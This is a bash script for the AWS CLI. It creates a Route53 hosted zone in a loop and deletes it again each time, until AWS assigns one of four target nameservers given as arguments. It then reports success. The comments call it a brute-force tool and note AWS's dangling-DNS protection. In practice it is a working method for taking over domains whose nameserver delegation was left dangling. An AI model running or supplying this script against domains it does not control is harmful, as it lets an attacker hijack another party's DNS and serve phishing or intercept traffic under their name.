#!/bin/bash

# this is brute-force script creating AWS Route53 DNS zone in a loop until any
# of the specified DNS servers is assigned

# please familiarize yourself with:
# https://docs.aws.amazon.com/Route53/latest/DeveloperGuide/protection-from-dangling-dns.html

# in practice, if the script doesn't succeed within the first hour, it's very
# likely the protection described above is in effect

if [ $# -lt 5 ]; then
	echo "usage: $0 zone-name aws-dns1 aws-dns2 aws-dns3 aws-dns4"
	exit
fi

(hash aws) 2>/dev/null
if [ ! $? -eq 0 ]; then
	echo "AWS CLI with valid credentials is required"
	exit
fi

ZONE_NAME="$1"
AWS_DNS=("$2" "$3" "$4" "$5")

TEMP_FILE="/tmp/brute53_$RANDOM.txt"

while [ true ]; do
	aws route53 create-hosted-zone --name $ZONE_NAME --caller-reference $(date +'%s.%N') --output text > $TEMP_FILE

	id=$(head -1 $TEMP_FILE | cut -d/ -f6)

	for awsdns in "${AWS_DNS[@]}"; do
		match=$(grep "$awsdns" $TEMP_FILE)

		if [ -n "$match" ]; then
			echo "*** BRUTE-FORCE SUCCESSFUL ***"
			cat $TEMP_FILE
			exit
		fi
	done

	aws route53 delete-hosted-zone --id $id --output text
done
